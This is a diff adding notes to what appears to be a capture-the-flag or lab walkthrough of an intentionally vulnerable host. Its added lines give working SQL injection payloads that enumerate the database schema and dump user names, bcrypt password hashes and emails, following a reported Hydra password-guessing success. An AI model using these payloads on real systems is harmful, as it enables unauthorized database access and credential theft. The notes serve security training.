@@ -156,4 +156,42 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-29 22:44:
 1 of 1 target successfully completed, 1 valid password found
 
 # got http://172.16.33.55/webmail/src/webmail.php and http://172.16.33.55/monitoring/index.php
+#on the monitoring page, the system app will detect a IP is down or not by ping.
+#if the IP is dead,the info of ID, hostname,time,and state will be insert in a table.
+# another app search for THE table to find any state which is 0 (down) and sent the info to the user's webmail.
 
+#there is a SQLi vuln on monitoring page, by add select on name form.
+
+$a" or 1=1#   #to detect whether a SQLi is excposed.
+
+d" union select concat(table_name,"-",table_schama),2,3,4 from information_schema.tables#
+   #to get all schema-table of the database.
+    information_schema-INNODB_BUFFER_PAGE_LRU,2,3,4
+    information_schema-INNODB_BUFFER_POOL_STATS,2,3,4
+    information_schema-INNODB_BUFFER_PAGE,2,3,4
+    monitoring-hosts,2,3,4
+    monitoring-log,2,3,4
+    monitoring-users,2,3,4
+    mysql-columns_priv,2,3,4
+    mysql-db,2,3,4
+    mysql-event,2,3,4
+
+# monitoring-users,2,3,4 may be useful
+
+coluofmon" union select column_name,2,3,4 from information_schema.columns where table_schema ='monitoring' and table_name = 'users'#
+  #to get column_name
+  coluofmon" union select column_name,2,3,4 from information_schema.columns where
+  table_schema ='monitoring' and table_name = 'users'# is down. Please check the
+  report below for more information.
+
+  ID, Host, Date Time, Status
+  id,2,3,4
+  username,2,3,4
+  password,2,3,4
+  email,2,3,4
+
+f" union select id,username,password,email from monitoring.users#
+  ID, Host, Date Time, Status
+  1,admin,$2y$12$huPSQmbcMvgHDkWIMnk9t.1cLoBWue3dtHf9E5cKUNcfKTOOp8cma,admin@insanityhosting.vm
+  2,nicholas,$2y$12$4R6JiYMbJ7NKnuQEoQW4ruIcuRJtDRukH.Tvx52RkUfx5eloIw7Qe,nicholas@insanityhosting.vm
+  3,otis,$2y$12$./XCeHl0/TCPW5zN/E9w0ecUUKbDomwjQ0yZqGz5tgASgZg6SIHFW,otis@insanityhosting.vm
